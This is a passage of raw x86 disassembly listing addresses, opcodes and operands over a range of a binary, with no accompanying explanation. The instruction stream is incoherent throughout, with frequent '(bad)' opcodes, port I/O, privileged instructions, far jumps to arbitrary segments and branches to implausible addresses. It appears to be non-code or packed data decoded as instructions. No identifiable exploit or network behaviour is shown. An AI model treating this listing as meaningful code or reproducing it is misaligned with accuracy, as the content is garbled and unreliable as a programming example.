  5275ff:	in     al,0xfb
  527601:	sbb    ebx,DWORD PTR [ecx]
  527603:	inc    ebx
  527604:	cdq    
  527605:	jnp    0x5275c5
  527607:	jg     0xb4741733
  52760d:	pop    ecx
  52760e:	cmp    BYTE PTR fs:[eax+0x9],dh
  527612:	pop    ss
  527613:	push   edi
  527614:	loop   0x5275a7
  527616:	ror    BYTE PTR [edx+ebp*1+0x2cbaaa3a],0x19
  52761e:	mov    WORD PTR [eax],cs
  527620:	xchg   esi,eax
  527621:	fdiv   QWORD PTR [esi+ebx*8-0x38]
  527625:	sub    DWORD PTR [ecx-0x24221476],ebx
  52762b:	popa   
  52762c:	in     al,0x80
  52762e:	popf   
  52762f:	dec    edi
  527630:	push   eax
  527631:	mov    BYTE PTR [esi-0x10],0x5e
  527635:	test   BYTE PTR [ecx-0x53],0xd9
  527639:	and    BYTE PTR [esi-0x4c],bh
  52763c:	add    al,BYTE PTR [edi+0x5efa4cc6]
  527642:	add    al,0xbc
  527644:	mov    fs,WORD PTR [edx-0x1c]
  527647:	ins    DWORD PTR es:[edi],dx
  527648:	leave  
  527649:	shl    DWORD PTR [eax],1
  52764b:	popa   
  52764c:	loop   0x527690
  52764e:	(bad)  
  52764f:	enter  0x3e38,0x30
  527653:	mov    ebp,0xae16bb30
  527658:	mov    ch,0xda
  52765a:	sub    eax,0x4d3d79e3
  52765f:	mov    bl,bl
  527661:	sub    ebp,DWORD PTR [edi-0x3c06e]
  527667:	and    al,0x40
  527669:	adc    ebx,esp
  52766b:	cwde   
  52766c:	shl    bl,cl
  52766e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52766f:	push   edx
  527670:	pushf  
  527671:	and    cl,BYTE PTR [edx-0x5ddbc4c4]
  527677:	sub    eax,0x7ca7206c
  52767c:	outs   dx,BYTE PTR ds:[esi]
  52767d:	dec    edi
  52767e:	enter  0x6ed9,0x97
  527682:	hlt    
  527683:	mov    al,0xd6
  527685:	cli    
  527686:	jmp    0x7f7f5dc
  52768b:	enter  0x7eca,0xa2
  52768f:	and    ebp,DWORD PTR [edx]
  527691:	sub    eax,0xc6bbc916
  527696:	fmul   st(1),st
  527698:	sbb    al,0xe6
  52769a:	out    dx,al
  52769b:	xor    eax,DWORD PTR [ebp+0x41]
  52769e:	fmul   DWORD PTR [ecx+0x6d]
  5276a1:	popf   
  5276a2:	call   0x3215a60a
  5276a7:	dec    esp
  5276a8:	inc    esi
  5276a9:	call   0x2019f808
  5276ae:	out    dx,al
  5276af:	mov    dh,0x73
  5276b1:	cmc    
  5276b2:	jmp    0xcee7bac2
  5276b7:	adc    dh,dh
  5276b9:	push   0x4125f699
  5276be:	ss lahf 
  5276c0:	imul   esp,DWORD PTR [edi],0x34
  5276c3:	pusha  
  5276c4:	cmp    eax,0xc99b2918
  5276c9:	(bad)  
  5276ca:	mov    ecx,0x59e5a1cc
  5276cf:	in     al,dx
  5276d0:	in     al,0xdb
  5276d2:	push   0xe67340f2
  5276d7:	xor    BYTE PTR [eax],al
  5276d9:	fcmove st,st(4)
  5276db:	les    ebx,FWORD PTR [ebp+0x3c29a316]
  5276e1:	sbb    cl,BYTE PTR [eax-0x5d678720]
  5276e7:	mov    esi,ebx
  5276e9:	into   
  5276ea:	and    DWORD PTR [ebx+0x17bb55e2],ebx
  5276f0:	xor    eax,0xa1dfe71c
  5276f5:	cwde   
  5276f6:	push   esp
  5276f7:	dec    esp
  5276f8:	fdivr  QWORD PTR [eax+esi*1+0x6a]
  5276fc:	mov    es,ebp
  5276fe:	mov    cl,0x4a
  527700:	les    esp,FWORD PTR [esi]
  527702:	repz sbb al,BYTE PTR [ebp+ebx*8+0x6a]
  527707:	xor    al,0x37
  527709:	or     al,bl
  52770b:	jne    0x5276e6
  52770d:	mov    ah,0xa0
  52770f:	frstor [eax+0x12]
  527712:	and    BYTE PTR ds:0x39f7c19d,0x8b
  527719:	xchg   esp,eax
  52771a:	adc    eax,0x439e82b8
  52771f:	jbe    0x5276ee
  527721:	adc    DWORD PTR [esi+ebp*4+0x7f68d19],ebp
  527728:	xchg   ebp,eax
  527729:	inc    eax
  52772a:	xor    al,0x6d
  52772c:	add    ebp,DWORD PTR [ecx+0xb0e9b0c]
  527732:	fsub   DWORD PTR [ebp+0x6d3374d0]
  527738:	rcr    BYTE PTR [edx],0xb0
  52773b:	icebp  
  52773c:	mov    eax,ds:0x5d5cc537
  527741:	xor    bh,bh
  527743:	adc    eax,0x4fe72229
  527748:	enter  0xade1,0x4e
  52774c:	iret   
  52774d:	sub    al,0x1a
  52774f:	dec    ebp
  527750:	xchg   ebx,eax
  527751:	gs (bad) 
  527753:	push   ebx
  527754:	sub    dh,cl
  527756:	push   cs
  527757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  527758:	sub    DWORD PTR [edi+0x61],edx
  52775b:	sbb    ecx,edi
  52775d:	adc    ah,bh
  52775f:	mov    ah,0x2
  527761:	aaa    
  527762:	int3   
  527763:	jno    0x527749
  527765:	jnp    0x527799
  527767:	sbb    eax,0x7f001bc8
  52776c:	mov    DWORD PTR [ebx-0x4d],edx
  52776f:	aad    0x83
  527771:	retf   0x878f
  527774:	xchg   edx,eax
  527775:	stc    
  527776:	jno    0x527742
  527778:	pop    ss
  527779:	sti    
  52777a:	(bad)  
  52777c:	inc    esp
  52777d:	fwait
  52777e:	repz mov ds:0x6f976cf5,al
  527784:	xor    eax,0x89a85eac
  527789:	add    BYTE PTR [ebx-0x31],dh
  52778c:	push   ebp
  52778d:	sub    al,0xe5
  52778f:	mov    bh,0x53
  527791:	inc    ebp
  527792:	ret    0xd8cd
  527795:	loopne 0x52771b
  527797:	mov    ah,0xe1
  527799:	in     al,0x55
  52779b:	xchg   esi,eax
  52779c:	shl    DWORD PTR [edi],1
  52779e:	pop    edx
  52779f:	adc    ebx,DWORD PTR [ebx+ecx*2-0x32cd09f3]
  5277a6:	mov    bl,0x77
  5277a8:	not    DWORD PTR [esi+0x20]
  5277ab:	outs   dx,BYTE PTR ds:[esi]
  5277ac:	es jns 0x52773d
  5277af:	sbb    DWORD PTR [edx-0x71c3acce],ebx
  5277b5:	fiadd  DWORD PTR [edi+0x18]
  5277b8:	ja     0x527819
  5277ba:	test   dl,bl
  5277bc:	rcr    BYTE PTR [edx-0x5b],cl
  5277bf:	mov    bl,0x94
  5277c1:	adc    al,0xed
  5277c3:	test   al,0x83
  5277c5:	sti    
  5277c6:	adc    cl,dh
  5277c8:	mov    ebp,0x97250932
  5277cd:	(bad)  
  5277ce:	pop    edi
  5277cf:	mov    ebx,0xd5629886
  5277d4:	and    eax,DWORD PTR [eax-0x47]
  5277d7:	outs   dx,BYTE PTR ds:[esi]
  5277d8:	cs mov al,0xd2
  5277db:	in     al,0x4d
  5277dd:	sub    al,0x26
  5277df:	sub    DWORD PTR [ecx+0x42],0x7bc6d9a3
  5277e6:	fsubr  st,st(2)
  5277e8:	(bad)  
  5277e9:	inc    esp
  5277ea:	retf   
  5277eb:	out    0x3b,al
  5277ed:	inc    ecx
  5277ee:	add    edx,DWORD PTR [ecx+0x51]
  5277f1:	ins    DWORD PTR es:[edi],dx
  5277f2:	mov    DWORD PTR [ebx-0x4656039e],esi
  5277f8:	sub    eax,0x95b4c3ed
  5277fd:	hlt    
  5277fe:	xchg   BYTE PTR [edi],dh
  527800:	jno    0x52780c
  527802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  527803:	adc    bl,BYTE PTR [edi+ebx*4+0x17]
  527807:	ins    DWORD PTR es:[edi],dx
  527808:	std    
  527809:	rcr    DWORD PTR ds:0xa8c10b5,0x5b
  527810:	adc    eax,0xbf61c2b3
  527815:	or     DWORD PTR [edx+edx*8+0x52],0xffffffcb
  52781a:	cmp    eax,0xffffffd0
  52781d:	stos   BYTE PTR es:[edi],al
  52781e:	add    WORD PTR [edi+ecx*4],si
  527822:	fst    DWORD PTR [ebp-0x4674f860]
  527828:	(bad)  
  527829:	(bad)  
  52782b:	jb     0x527858
  52782d:	push   ecx
  52782e:	mov    ss,WORD PTR [esp+ecx*2+0x5ec7d8f7]
  527835:	fdivr  st(7),st
  527837:	into   
  527838:	mov    dh,0xa4
  52783a:	xor    ch,BYTE PTR [ebx]
  52783c:	push   edi
  52783d:	and    eax,0x996e42fe
  527842:	lods   al,BYTE PTR ds:[esi]
  527843:	push   ss
  527844:	sbb    BYTE PTR ds:0x6b6bc544,0x33
  52784b:	test   al,0xa
  52784d:	nop
  52784e:	outs   dx,DWORD PTR ds:[esi]
  52784f:	iret   
  527850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  527851:	and    ecx,DWORD PTR [ecx+0x76932bed]
  527857:	xor    eax,0xe787d88b
  52785c:	pop    es
  52785d:	clc    
  52785e:	mov    ebx,0x87b18563
  527863:	xchg   edx,eax
  527864:	lds    edi,FWORD PTR [edi+0x37]
  527867:	pop    edi
  527868:	sub    BYTE PTR [ecx-0x13547082],bh
  52786e:	pop    esi
  52786f:	add    al,0xce
  527871:	sub    DWORD PTR [edx-0x7],ecx
  527874:	inc    esp
  527875:	into   
  527876:	repnz outs dx,BYTE PTR ds:[esi]
  527878:	or     DWORD PTR [ecx+esi*4],ebp
  52787b:	jle    0x52781b
  52787d:	sub    BYTE PTR [ecx],ah
  52787f:	sub    al,BYTE PTR [esi]
  527881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  527882:	pop    ss
  527883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  527884:	dec    eax
  527885:	fidiv  DWORD PTR [edi+0x48234da5]
  52788b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52788c:	dec    eax
  52788d:	pop    ebx
  52788e:	test   eax,0x4f4342c4
  527893:	jno    0x5278a5
  527895:	sar    BYTE PTR [edi+0x25],1
  527898:	jmp    0x5171:0x2fcedd92
  52789f:	or     eax,0x5a9a56af
  5278a4:	pop    ecx
  5278a5:	jle    0x5278f8
  5278a7:	sub    eax,0x1205836c
  5278ac:	or     al,BYTE PTR [edx+0xd]
  5278af:	aam    0xaa
  5278b1:	or     bl,cl
  5278b3:	mov    DWORD PTR [ebx+0x48c1ad89],ebx
  5278b9:	call   0x8044:0xadeea0f7
  5278c0:	mov    cl,0xfa
  5278c2:	sub    al,0x2f
  5278c4:	pop    ds
  5278c5:	add    BYTE PTR [ebx-0x41],dl
  5278c8:	cmp    dh,0x99
  5278cb:	ins    BYTE PTR es:[edi],dx
  5278cc:	shl    dh,0xf7
  5278cf:	icebp  
  5278d0:	cmp    eax,ebp
  5278d2:	(bad)  
  5278d3:	xchg   ebx,eax
  5278d4:	and    DWORD PTR [ebp+0x3ca524b1],0xffffff93
  5278db:	pop    es
  5278dc:	stos   DWORD PTR es:[edi],eax
  5278dd:	loopne 0x527917
  5278df:	cdq    
  5278e0:	fisttp WORD PTR ds:[eax]
  5278e3:	fadd   QWORD PTR [ebx+0x30]
  5278e6:	xchg   ebp,eax
  5278e7:	mov    eax,ebx
  5278e9:	repnz fisttp QWORD PTR [esi-0x446ee732]
  5278f0:	push   0x375e6a81
  5278f5:	mov    bl,0x97
  5278f7:	mov    ebp,0xfac3d42e
  5278fc:	pop    esp
  5278fd:	retf   
  5278fe:	jbe    0x527901
  527900:	push   ecx
  527901:	stos   BYTE PTR es:[edi],al
  527902:	mov    cl,0x12
  527904:	adc    eax,0xf9574a14
  527909:	inc    esi
  52790a:	pop    ebp
  52790b:	xor    esi,DWORD PTR [ecx-0x16b67d14]
  527911:	sub    DWORD PTR [ebx],eax
  527913:	sbb    ebx,DWORD PTR [esi-0x61face36]
  527919:	sbb    ebp,DWORD PTR [si+0xf79]
  52791e:	add    al,0xe1
  527920:	ficomp WORD PTR [edx+0x7b]
  527923:	js     0x52793f
  527925:	lahf   
  527926:	hlt    
  527927:	adc    al,ah
  527929:	nop
  52792a:	mov    esp,0xd4c8f1bc
  52792f:	dec    esp
  527930:	das    
  527931:	inc    edi
  527932:	retf   0xe475
  527935:	inc    esi
  527936:	out    0x87,al
  527938:	xor    ah,al
  52793a:	sbb    BYTE PTR [ebp+ebp*4+0x4bc1f293],bl
  527941:	xor    eax,0x2aa48dd4
  527946:	pusha  
  527947:	sbb    ah,BYTE PTR [ecx-0x7b]
  52794a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52794b:	out    dx,al
  52794c:	ret    
  52794d:	lods   eax,DWORD PTR ds:[esi]
  52794e:	push   esi
  52794f:	add    al,0x3
  527951:	adc    ecx,esp
  527953:	cmp    esp,DWORD PTR [ecx+0x1d]
  527956:	in     eax,dx
  527957:	das    
  527958:	xor    dh,BYTE PTR [eax]
  52795a:	jo     0x5279ac
  52795c:	mov    esi,0x5509104
  527961:	jle    0x52797f
  527963:	and    edx,ecx
  527965:	bound  esi,QWORD PTR [ebx-0x7c02fe26]
  52796b:	ds dec edi
  52796d:	in     eax,0x2b
  52796f:	dec    eax
  527970:	lea    esp,[edi-0x75]
  527973:	sahf   
  527974:	pop    ebx
  527975:	into   
  527976:	js     0x527990
  527978:	jmp    0x5279d5
  52797a:	dec    esp
  52797b:	inc    ebp
  52797c:	mov    eax,0x77cc69dd
  527981:	fsubr  QWORD PTR [ecx-0x80]
  527984:	mov    WORD PTR [ecx+0x1d],cs
  527987:	hlt    
  527988:	push   cs
  527989:	(bad)  
  52798a:	daa    
  52798b:	dec    edi
  52798c:	ins    BYTE PTR es:[edi],dx
  52798d:	mov    edi,0xa4c5dde0
  527992:	test   bl,dh
  527994:	into   
  527995:	or     ch,BYTE PTR [edx+0x2c]
  527998:	pop    esi
  527999:	addr16 cmp eax,0x8c39719e
  52799f:	fld    QWORD PTR [edi]
  5279a1:	cmp    al,0x6
  5279a3:	jns    0x5279c6
  5279a5:	fwait
  5279a6:	arpl   WORD PTR [eax],di
  5279a8:	iret   
  5279a9:	aam    0x1f
  5279ab:	ins    BYTE PTR es:[edi],dx
  5279ac:	in     al,dx
  5279ad:	push   edi
  5279ae:	xor    ebp,edi
  5279b0:	std    
  5279b1:	cmp    DWORD PTR [ecx],eax
  5279b3:	in     al,0x89
  5279b5:	mov    ebx,0xd103effd
  5279ba:	jl     0x527a16
  5279bc:	imul   ecx,DWORD PTR [edx+0x2e],0x14
  5279c0:	aam    0x97
  5279c2:	daa    
  5279c3:	arpl   WORD PTR [edx],di
  5279c5:	mov    ebx,DWORD PTR [ecx-0x1414f45]
  5279cb:	cld    
  5279cc:	mov    ah,0x96
  5279ce:	cmp    eax,DWORD PTR [bx+si+0x549]
  5279d3:	inc    edx
  5279d4:	cmp    eax,0xd449127
  5279d9:	mov    eax,ds:0x6b877524
  5279de:	call   0x70a03aa8
  5279e3:	aaa    
  5279e4:	mov    ch,0xb7
  5279e6:	(bad)  
  5279e7:	out    0x33,eax
  5279e9:	(bad)
  5279ed:	out    dx,eax
  5279ee:	rol    BYTE PTR [edx],1
  5279f0:	mov    ds:0x44db46f9,al
  5279f5:	not    ebp
  5279f7:	ins    BYTE PTR es:[edi],dx
  5279f8:	mov    edx,0x793477d0
  5279fd:	xor    al,0xb0
  5279ff:	mov    esp,0x9e014430
  527a04:	test   BYTE PTR [eax],al
  527a06:	std    
  527a07:	xchg   ebx,eax
  527a08:	sub    al,0xe1
  527a0a:	xchg   esi,eax
  527a0b:	cmp    BYTE PTR [ecx-0x2f5b4536],ah
  527a11:	push   ebx
  527a12:	fidivr DWORD PTR [ebp+esi*2-0x53843fe9]
  527a19:	scas   al,BYTE PTR es:[edi]
  527a1a:	outs   dx,BYTE PTR ds:[esi]
  527a1b:	neg    esi
  527a1d:	xchg   DWORD PTR [esp+edi*1+0x7a],edx
  527a21:	rol    BYTE PTR [edx+ebp*8],cl
  527a24:	jb     0x527a44
  527a26:	mov    eax,ds:0x99ac9d0a
  527a2b:	xchg   edx,eax
  527a2c:	stos   DWORD PTR es:[edi],eax
  527a2d:	out    dx,eax
  527a2e:	sub    edx,DWORD PTR [esi+0x651dfdc5]
  527a34:	mov    ch,0xe1
  527a36:	xchg   ecx,eax
  527a37:	fstp   DWORD PTR [esi+0x3f8dd186]
  527a3d:	inc    DWORD PTR [edi]
  527a3f:	in     eax,0xf0
  527a41:	sahf   
  527a42:	in     al,dx
  527a43:	in     eax,dx
  527a44:	fadd   DWORD PTR ds:0x40b07023
  527a4a:	sbb    eax,0x991c5dbd
  527a4f:	sti    
  527a50:	jmp    0x5279f5
  527a52:	cli    
  527a53:	enter  0x9dfb,0xa5
  527a57:	pop    ecx
  527a58:	sub    al,0x60
  527a5a:	pop    ss
  527a5b:	js     0x527a16
  527a5d:	jne    0x527ad6
  527a5f:	aad    0xc3
  527a61:	adc    ebp,edx
  527a63:	test   al,0xf2
  527a65:	sbb    DWORD PTR gs:[eax-0x55],esi
  527a69:	rcl    BYTE PTR [esi+0x5f],cl
  527a6c:	and    BYTE PTR [edx],0x56
  527a6f:	inc    ecx
  527a70:	js     0x527a38
  527a72:	jl     0x5279fc
  527a74:	lock cmp dl,ah
  527a77:	popa   
  527a78:	mov    di,0x2f66
  527a7c:	in     al,dx
  527a7d:	loope  0x527ab1
  527a7f:	mov    bl,0x33
  527a81:	xchg   ebx,eax
  527a82:	mov    eax,ds:0x8edddd83
  527a87:	mov    ?,WORD PTR [ecx+0x5d98de6]
  527a8d:	popf   
  527a8e:	loop   0x527a3d
  527a90:	sub    cl,dl
  527a92:	ins    BYTE PTR es:[edi],dx
  527a93:	(bad)  
  527a94:	ins    DWORD PTR es:[edi],dx
  527a95:	stos   BYTE PTR es:[edi],al
  527a96:	mov    edi,0x7130e73b
  527a9b:	popf   
  527a9c:	(bad)  
  527a9d:	push   ebx
  527a9e:	add    eax,DWORD PTR es:[ecx]
  527aa1:	(bad)
  527aa4:	mov    ch,bh
  527aa6:	jo     0x527a94
  527aa8:	loope  0x527acd
  527aaa:	pusha  
  527aab:	shl    BYTE PTR [esi+0x65],cl
  527aae:	xor    DWORD PTR [ebx-0x3ba4a509],edi
  527ab4:	push   0x515197ce
  527ab9:	xchg   edx,eax
  527aba:	xchg   esi,eax
  527abb:	cs ja  0x527b01
  527abe:	jmp    0x715bbfa4
  527ac3:	loope  0x527b24
  527ac5:	outs   dx,DWORD PTR ds:[esi]
  527ac6:	loop   0x527b05
  527ac8:	repz sbb edi,0xc8fde2dc
  527acf:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  527ad1:	cmp    edi,ebx
  527ad3:	(bad)  
  527ad4:	sbb    BYTE PTR [ebx+edx*8+0x7cc4e697],dh
  527adb:	cmp    DWORD PTR [edx+0x7957eb32],0xffffffff
  527ae2:	sub    al,0xeb
  527ae4:	lahf   
  527ae5:	arpl   WORD PTR [ecx+edi*8-0x5d],di
  527ae9:	inc    esp
  527aea:	(bad)  
  527aec:	inc    ebp
  527aed:	mov    al,0x13
  527aef:	aam    0x5d
  527af1:	sbb    bh,0xc5
  527af4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  527af5:	fist   WORD PTR [eax]
  527af7:	pop    ss
  527af8:	inc    edi
  527af9:	xchg   edx,eax
  527afa:	jo     0x527ab9
  527afc:	inc    edi
  527afd:	xor    BYTE PTR [ecx],bh
  527aff:	mov    ebp,?
  527b01:	cli    
  527b02:	es mov ch,0x1c
  527b05:	jmp    0x48f8:0xe9ef5ca9
  527b0c:	jmp    0xf02ad722
  527b11:	sub    ah,BYTE PTR [ecx-0xd]
  527b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  527b15:	or     edi,DWORD PTR [edi+0x6b]
  527b18:	fs in  al,dx
  527b1a:	push   ss
  527b1b:	ret    
  527b1c:	shr    DWORD PTR [esi-0x1f698796],cl
  527b22:	(bad)  
  527b23:	js     0x527b8e
  527b25:	fdiv   DWORD PTR [edx+0x19]
  527b28:	ret    
  527b29:	cli    
  527b2a:	call   0xd77d:0x2a4a8013
  527b31:	xchg   ecx,eax
  527b32:	xchg   esi,eax
  527b33:	aas    
  527b34:	mov    edi,0xa84bfca6
  527b39:	pop    ss
  527b3a:	mov    eax,ds:0xe39bda84
  527b3f:	fucom  st(6)
  527b41:	sbb    dh,cl
  527b43:	xchg   edi,eax
  527b44:	inc    ebp
  527b45:	push   ebx
  527b46:	(bad)
  527b4a:	mov    BYTE PTR [edx+0x4c4dc592],bh
  527b50:	sub    ebx,DWORD PTR [edi+0x18911809]
  527b56:	cmp    eax,0x5067a599
  527b5b:	mov    ebp,0xf66fdbce
  527b60:	call   0xb06f7b28
  527b65:	mov    dh,0xac
  527b67:	push   edx
  527b68:	adc    bh,BYTE PTR [eax-0x18]
  527b6b:	add    bh,0xf6
  527b6e:	xchg   edi,eax
  527b6f:	loop   0x527b2a
  527b71:	xchg   DWORD PTR [edi+0x54],edi
  527b74:	mov    ebx,0xe1b23063
  527b79:	jmp    0x527b58
  527b7b:	arpl   bx,di
  527b7d:	in     al,dx
  527b7e:	loope  0x527b09
  527b80:	inc    esp
  527b81:	mov    ds:0xf3239d0e,eax
  527b86:	xchg   esp,eax
  527b87:	fwait
  527b88:	pop    ds
  527b89:	pop    ebx
  527b8a:	inc    esp
  527b8b:	mov    ds:0x5e9e4405,al
  527b90:	(bad)  
  527b91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  527b92:	popf   
  527b93:	imul   edi,ebp,0x23
  527b96:	imul   esp,DWORD PTR [edi+0x581a410d],0xffffffe5
  527b9d:	outs   dx,BYTE PTR ds:[esi]
  527b9e:	aam    0xf2
  527ba0:	and    DWORD PTR [edi-0x51],ebx
  527ba3:	std    
  527ba4:	aaa    
  527ba5:	sar    DWORD PTR [ebx],1
  527ba7:	mov    edx,0xa0a1715f
  527bac:	xor    ebp,0x67
  527baf:	jecxz  0x527bb5
  527bb1:	mov    ch,0xd5
  527bb3:	ss pop ds
  527bb5:	es mov ch,0x66
  527bb8:	push   ecx
  527bb9:	jne    0x527c19
  527bbb:	pop    ebp
  527bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  527bbd:	fadd   QWORD PTR [edi]
  527bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  527bc0:	inc    edx
  527bc1:	inc    esp
  527bc2:	test   DWORD PTR [eax-0x66e221ed],0xb42d915a
  527bcc:	mov    ecx,DWORD PTR ds:0x7ba1c59
  527bd2:	loopne 0x527bcd
  527bd4:	push   0x55
  527bd6:	jmp    0x527c44
  527bd8:	push   cs
  527bd9:	push   esp
  527bda:	cmc    
  527bdb:	push   ds
  527bdc:	js     0x527c06
  527bde:	das    
  527bdf:	ss inc edx
  527be1:	or     BYTE PTR [esi+0x64],bl
  527be4:	retf   
  527be5:	mov    eax,0xe3a79289
  527bea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  527beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  527bec:	mov    esp,0xa7554a5d
  527bf1:	(bad)  
  527bf2:	stos   BYTE PTR es:[edi],al
  527bf3:	test   BYTE PTR [ebx-0x18],dh
  527bf6:	cdq    
  527bf7:	std    
  527bf8:	cmp    dl,BYTE PTR [ebx+0x1f5b0d6a]
  527bfe:	inc    ebx
  527bff:	test   DWORD PTR [ebp-0x4b1aee0f],esp
  527c05:	mov    ds:0x2e53323d,al
  527c0a:	stos   BYTE PTR es:[edi],al
  527c0b:	xor    bl,bl
  527c0d:	ja     0x527c01
  527c0f:	or     eax,0x6c
  527c12:	loope  0x527c53
  527c14:	sub    edi,DWORD PTR [eax]
  527c16:	in     eax,dx
  527c17:	adc    al,BYTE PTR ds:0x51fc0adb
  527c1d:	mov    esi,0xd800cefa
  527c22:	jge    0x527c36
  527c24:	cmp    DWORD PTR [ecx-0x74],0xffffff95
  527c28:	push   esi
  527c29:	xor    eax,0x6c33763
  527c2e:	cmp    eax,0x86c85157
  527c33:	xor    DWORD PTR [edi-0x17],edx
  527c36:	dec    esi
  527c37:	xchg   esi,eax
  527c38:	dec    esi
  527c39:	in     al,0xaf
  527c3b:	fnsave [ebx-0x54a703a3]
  527c41:	mov    edi,0x3c601bfe
  527c46:	aam    0x20
  527c48:	jbe    0x527c9d
  527c4a:	jae    0x527cba
  527c4c:	inc    ebp
  527c4d:	mov    ecx,0x5a68962c
  527c52:	mov    al,0xb2
  527c54:	(bad)  
  527c56:	xor    eax,DWORD PTR [eax]
  527c58:	mov    ebp,edi
  527c5a:	and    bl,BYTE PTR [edi-0x7a]
  527c5d:	mov    ch,0xc2
  527c5f:	sub    DWORD PTR [eax-0x5d],ebp
  527c62:	mov    edx,0x44164216
  527c67:	xchg   DWORD PTR [ebp-0x49cb7542],ecx
  527c6d:	aaa    
  527c6e:	mov    bh,0xc4
  527c70:	mov    DWORD PTR [eax],ebx
  527c72:	into   
  527c73:	xchg   ebx,eax
  527c74:	or     al,BYTE PTR [eax]
  527c76:	jl     0x527c44
  527c78:	leave  
  527c79:	in     eax,0xfa
  527c7b:	or     bl,BYTE PTR [ecx-0x61]
  527c7e:	pop    edi
  527c7f:	stc    
  527c80:	iret   
  527c81:	sub    ebx,DWORD PTR [eax+edi*1-0x2ac26bb7]
  527c88:	add    ah,bh
  527c8a:	and    esi,esi
  527c8c:	jp     0x527cf2
  527c8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  527c8f:	mov    bl,0x16
  527c91:	xchg   esp,eax
  527c92:	shr    DWORD PTR [ecx+0xb],1
  527c95:	test   eax,0x947914b8
  527c9a:	pop    esp
  527c9b:	and    DWORD PTR [edi-0x12],0x50
  527c9f:	sub    eax,0xb1e8eec2
  527ca4:	add    ebp,DWORD PTR [edx+0x71]
  527ca7:	fs xchg edi,eax
  527ca9:	int    0x44
  527cab:	cmp    al,0xe
  527cad:	sbb    al,0xd9
  527caf:	(bad)
  527cb3:	popf   
  527cb4:	pop    ebp
  527cb5:	inc    ebx
  527cb6:	inc    edx
  527cb7:	cmp    al,0x17
  527cb9:	push   ecx
  527cba:	add    BYTE PTR [esi-0x30415be5],cl
  527cc0:	cmp    BYTE PTR [ebp-0x70],0x3
  527cc4:	cmp    bh,BYTE PTR [eax]
  527cc6:	in     eax,0xf2
  527cc8:	pusha  
  527cc9:	jae    0x527ca2
  527ccb:	(bad)
  527ccf:	push   ss
  527cd0:	mov    esp,DWORD PTR [ebx]
  527cd2:	jns    0x527c83
  527cd4:	xchg   ebp,eax
  527cd5:	push   esp
  527cd6:	adc    BYTE PTR [ebp+0x30],ch
  527cd9:	or     eax,0xa4bc70e8
  527cde:	or     eax,0xd989d9fc
  527ce3:	mov    dh,0x82
  527ce5:	sub    DWORD PTR [ebp-0x2d],edi
  527ce8:	pop    ss
  527ce9:	pushf  
  527cea:	fistp  DWORD PTR [edx]
  527cec:	jnp    0x527cde
  527cee:	cmp    BYTE PTR [ecx-0x77],ch
  527cf1:	mov    BYTE PTR [esi-0x41],dl
  527cf4:	mov    ds:0x709d26be,al
  527cf9:	xor    eax,0x63e014ec
  527cfe:	popa   
  527cff:	pop    es
  527d00:	mov    cl,0xd5
  527d02:	mov    edi,0x6e870809
  527d07:	dec    edi
  527d08:	loope  0x527d6a
  527d0a:	jle    0x527cdf
  527d0c:	mov    WORD PTR [eax-0x44],cs
  527d0f:	pop    esi
  527d10:	ret    
  527d11:	ffree  st(2)
  527d13:	stos   BYTE PTR es:[edi],al
  527d14:	pop    edi
  527d15:	in     eax,0x6
  527d17:	xchg   esp,eax
  527d18:	pop    edx
  527d19:	cmp    BYTE PTR [ebp-0x4354fc08],0x49
  527d20:	icebp  
  527d21:	adc    esp,0xfffffff4
  527d24:	mov    WORD PTR ss:[esi-0x21109fe1],es
  527d2b:	dec    BYTE PTR [ecx+edi*1]
  527d2e:	lods   al,BYTE PTR ds:[esi]
  527d2f:	mov    WORD PTR [ebx-0x670800a4],gs
  527d35:	adc    DWORD PTR [edx+0x58],ecx
  527d38:	test   edx,ebp
  527d3a:	cli    
  527d3b:	imul   eax,DWORD PTR [edx],0xc
  527d3e:	mov    al,ds:0xf2ed00ac
  527d43:	xor    eax,DWORD PTR [edi]
  527d45:	or     ch,BYTE PTR [eax]
  527d47:	mov    ch,0x4f
  527d49:	pop    esi
  527d4a:	cmc    
  527d4b:	stos   BYTE PTR es:[edi],al
  527d4c:	adc    al,0x28
  527d4e:	sbb    esp,ebp
  527d50:	xchg   esi,eax
  527d51:	and    ecx,edx
  527d53:	mov    gs,WORD PTR [edi]
  527d55:	jno    0x527dc7
  527d57:	arpl   WORD PTR ds:0x219709,cx
  527d5d:	test   esp,edi
  527d5f:	sbb    edi,eax
  527d61:	push   ds
  527d62:	call   0x9a38f10b
  527d67:	int    0x84
  527d69:	jmp    0xebeb1701
  527d6e:	sbb    DWORD PTR [ebx-0x7bec183e],eax
  527d74:	sbb    al,bl
  527d76:	inc    edi
  527d77:	test   BYTE PTR [ebp-0x7da74485],ch
  527d7d:	test   BYTE PTR [esi-0x70],al
  527d80:	ds cli 
  527d82:	jns    0x527dfa
  527d84:	shl    BYTE PTR [ebx],1
  527d86:	xchg   WORD PTR [edi-0x52],ax
  527d8a:	stos   DWORD PTR es:[edi],eax
  527d8b:	ins    DWORD PTR es:[edi],dx
  527d8c:	test   al,0x9b
  527d8e:	shr    DWORD PTR [ebp+0x7758675b],cl
  527d94:	and    ah,BYTE PTR [esi]
  527d96:	imul   ebx,DWORD PTR [ecx-0x25f10b80],0xffffffe9
  527d9d:	leave  
  527d9e:	outs   dx,BYTE PTR ds:[esi]
  527d9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  527da0:	pop    ss
  527da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  527da2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  527da3:	int    0x5f
